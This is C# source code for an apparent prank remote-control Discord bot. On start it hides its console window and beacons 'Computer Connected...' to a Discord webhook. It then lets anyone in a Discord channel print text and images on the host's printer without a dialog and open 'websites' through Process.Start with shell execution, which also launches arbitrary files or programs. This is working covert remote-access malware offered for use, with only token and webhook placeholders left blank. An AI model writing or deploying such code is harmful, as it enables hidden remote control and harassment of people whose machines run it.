using Discord;
using Discord.WebSocket;
using NAudio.Wave;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Printing;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.Json;

class Program
{
    // Import necessary Windows API functions
    [DllImport("kernel32.dll")]
    static extern IntPtr GetConsoleWindow();

    [DllImport("user32.dll")]
    static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

    // Window visibility constants
    const int SW_HIDE = 0;
    const int SW_SHOW = 5;

    private DiscordSocketClient _client = null!;

    static async Task Main()
    {
        var handle = GetConsoleWindow();

        // Hide the console :)
        ShowWindow(handle, SW_HIDE);

        // webhook to notify discord server that computer has started

        string webhookUrl = "YOUR_WEBHOOK";

        using HttpClient client = new HttpClient();

        var payload = new
        {
            username = "Buttplugger",
            content = "Computer Connected..."
        };

        string json = JsonSerializer.Serialize(payload);

        using var content = new StringContent(
            json,
            Encoding.UTF8,
            "application/json"
        );

        HttpResponseMessage response =
            await client.PostAsync(webhookUrl, content);

        if (response.IsSuccessStatusCode)
        {
            Console.WriteLine("Message sent successfully!");
        }
        else
        {
            Console.WriteLine(
                $"Failed: {(int)response.StatusCode} " +
                $"{response.ReasonPhrase}"
            );
        }

        //

        var program = new Program();
        await program.RunAsync();
    }

    public async Task RunAsync()
    {
        var config = new DiscordSocketConfig
        {
            GatewayIntents =
                GatewayIntents.Guilds |
                GatewayIntents.GuildMessages |
                GatewayIntents.MessageContent
        };

        _client = new DiscordSocketClient(config);

        _client.Log += message =>
        {
            Console.WriteLine(message);
            return Task.CompletedTask;
        };

        _client.MessageReceived += HandleMessageAsync;

        string token = "YOUR_BOT_TOKEN";

        await _client.LoginAsync(TokenType.Bot, token);
        await _client.StartAsync();

        await Task.Delay(Timeout.Infinite);
    }

    public static void PrintText(string text)
    {
        PrintDocument doc = new PrintDocument();

        doc.PrintPage += (sender, e) =>
        {
            using Font font = new Font("Arial", 36);

            e.Graphics!.DrawString(
                text,
                font,
                Brushes.Black,
                e.MarginBounds
            );
        };

        // Print to the default printer without a dialog
        doc.Print();

        doc.Dispose();
    }

    public static void PrintImage(string imagePath)
    {
        using var image = System.Drawing.Image.FromFile(imagePath);
        using var printDocument = new PrintDocument();

        printDocument.PrintPage += (sender, e) =>
        {
            if (e.Graphics == null)
                return;

            Rectangle bounds = e.MarginBounds;

            // Scale the image to fit the printable area.
            float scale = Math.Min(
                (float)bounds.Width / image.Width,
                (float)bounds.Height / image.Height);

            int width = (int)(image.Width * scale);
            int height = (int)(image.Height * scale);

            // Center the image on the page.
            int x = bounds.Left + (bounds.Width - width) / 2;
            int y = bounds.Top + (bounds.Height - height) / 2;

            e.Graphics.DrawImage(image, x, y, width, height);

            e.HasMorePages = false;
        };

        printDocument.Print();
    }



    private async Task HandleMessageAsync(SocketMessage message)
    {
        String[] args = message.Content.Split(' ');

        // Ignore bots
        if (message.Author.IsBot)
            return;

        // Help command - list cmds
        if (args[0].Equals(
            "!help",
            StringComparison.OrdinalIgnoreCase))
        {
            if(args.Length > 1)
            {
                await message.Channel.SendMessageAsync("Error: too many parameters");
                return;
            }

            await message.Channel.SendMessageAsync(
                "List of commands: " + Environment.NewLine + "!help - gives a list of commands"
                + Environment.NewLine + "!website <url> - opens a website of your choosing"
                + Environment.NewLine + "!printmsg <msg> - prints out a piece of paper with text of your choice"
                + Environment.NewLine + "!printimg <url> - prints out an image"

            );
        }
        // end help cmd

        // example cmd
        if (args[0].Equals(
            "!printmsg",
            StringComparison.OrdinalIgnoreCase))
        {

            await message.Channel.SendMessageAsync("Attempting to print your message");
            string remaining = string.Join(" ", args.Skip(1));
            PrintText(remaining);
        }

        if (args[0].Equals("!printimg", StringComparison.OrdinalIgnoreCase))
        {
            if (args.Length < 2)
            {
                await message.Channel.SendMessageAsync(
                    "Usage: `!printimg <direct image URL>`");
                return;
            }

            string imageUrl = args[1];

            if (!Uri.TryCreate(imageUrl, UriKind.Absolute, out Uri? uri) ||
                (uri.Scheme != Uri.UriSchemeHttp &&
                 uri.Scheme != Uri.UriSchemeHttps))
            {
                await message.Channel.SendMessageAsync(
                    "Please provide a valid HTTP or HTTPS image URL.");
                return;
            }

            string imagePath = Path.Combine(
                Path.GetTempPath(),
                $"discord_print_{Guid.NewGuid()}.png");

            try
            {
                using var http = new HttpClient();
                using var response = await http.GetAsync(uri);

                response.EnsureSuccessStatusCode();

                string? contentType =
                    response.Content.Headers.ContentType?.MediaType;

                if (contentType == null ||
                    !contentType.StartsWith(
                        "image/",
                        StringComparison.OrdinalIgnoreCase))
                {
                    await message.Channel.SendMessageAsync(
                        "That URL doesn't point directly to an image.");
                    return;
                }

                await using (var file = File.Create(imagePath))
                {
                    await response.Content.CopyToAsync(file);
                }

                PrintImage(imagePath);

                await message.Channel.SendMessageAsync(
                    "Image sent to the printer!");
            }
            catch (Exception ex)
            {
                await message.Channel.SendMessageAsync(
                    $"Failed to print the image: {ex.Message}");
            }
            finally
            {
                if (File.Exists(imagePath))
                    File.Delete(imagePath);
            }

            return;
        }

        // Open website -
        if (args[0].Equals(
            "!website",
            StringComparison.OrdinalIgnoreCase))
        {
            if (args.Length != 2)
            {
                await message.Channel.SendMessageAsync("Error: invalid use of command, example: !website <url>");
                return;
            }

            try
            {
                Process.Start(new ProcessStartInfo
                {
                    FileName = args[1],
                    UseShellExecute = true
                });
            }
            catch
            {
                await message.Channel.SendMessageAsync("An unknown error occured, please ensure your link starts with http:// or https://");
                return;
            }

            await message.Channel.SendMessageAsync(
                "Website opened successfully"
            );
        }
        // end website command
    }
}